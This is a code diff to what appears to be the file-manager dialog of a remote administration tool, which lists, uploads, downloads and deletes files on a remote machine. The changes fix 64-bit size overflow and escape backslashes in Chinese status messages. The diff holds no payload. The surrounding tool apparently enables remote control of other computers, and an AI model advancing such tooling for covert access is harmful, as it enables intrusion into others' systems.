@@ -1090,7 +1090,7 @@ void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
 					memcpy(&dwFileSizeHigh, pList, 4);
 					memcpy(&dwFileSizeLow, pList + 4, 4);
 					CString strSize;
-					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
+					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+long long(1))) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
 					m_list_remote.SetItemText(nItem, 1, strSize);
 					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
 					CTime	time(ftm_strReceiveLocalFileTime);
@@ -1503,7 +1503,7 @@ BOOL CFileManagerDlg::SendUploadJob()
 	if (hFile == INVALID_HANDLE_VALUE)
 		return FALSE;
 	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
-	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;
+	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+long long(1))) + dwSizeLow;
 
 	CloseHandle(hFile);
 	// 构造数据包，发送文件长度
@@ -1537,7 +1537,7 @@ BOOL CFileManagerDlg::SendDeleteJob()
 
 	if (file.GetAt(file.GetLength() - 1) == '\\')
 	{
-		ShowMessage("远程：删除目录 %s\*.* 完成", file);
+		ShowMessage("远程：删除目录 %s\\*.* 完成", file);
 		bPacket[0] = COMMAND_DELETE_DIRECTORY;
 	}
 	else
@@ -1579,7 +1579,7 @@ void CFileManagerDlg::CreateLocalRecvFile()
 	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
 	DWORD	dwSizeLow = pFileSize->dwSizeLow;
 
-	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;
+	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+long long(1))) + dwSizeLow;
 
 	// 当前正操作的文件名
 	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);
@@ -1669,7 +1669,7 @@ void CFileManagerDlg::CreateLocalRecvFile()
 			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
 			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
 			// 接收的长度递增
-			m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD+1);
+			m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD+long long(1));
 			m_nCounter += FindFileData.nFileSizeLow;
 
 			dwCreationDisposition = OPEN_EXISTING;
@@ -1818,7 +1818,7 @@ void CFileManagerDlg::EndLocalRecvFile()
 		m_nTransferMode = TRANSFER_MODE_NORMAL;	
 		EnableControl(TRUE);
 		FixedLocalFileList(".");
-		ShowMessage("本地：装载目录 %s\*.* 完成", m_Local_Path);
+		ShowMessage("本地：装载目录 %s\\*.* 完成", m_Local_Path);
 	}
 	else
 	{
@@ -1841,7 +1841,7 @@ void CFileManagerDlg::EndLocalUploadFile()
 		m_bIsStop = false;
 		EnableControl(TRUE);
 		GetRemoteFileList(".");
-		ShowMessage("远程：装载目录 %s\*.* 完成", m_Remote_Path);
+		ShowMessage("远程：装载目录 %s\\*.* 完成", m_Remote_Path);
 	}
 	else
 	{
@@ -1859,7 +1859,7 @@ void CFileManagerDlg::EndRemoteDeleteFile()
 		m_bIsStop = false;
 		EnableControl(TRUE);
 		GetRemoteFileList(".");
-		ShowMessage("远程：装载目录 %s\*.* 完成", m_Remote_Path);
+		ShowMessage("远程：装载目录 %s\\*.* 完成", m_Remote_Path);
 	}
 	else
 	{
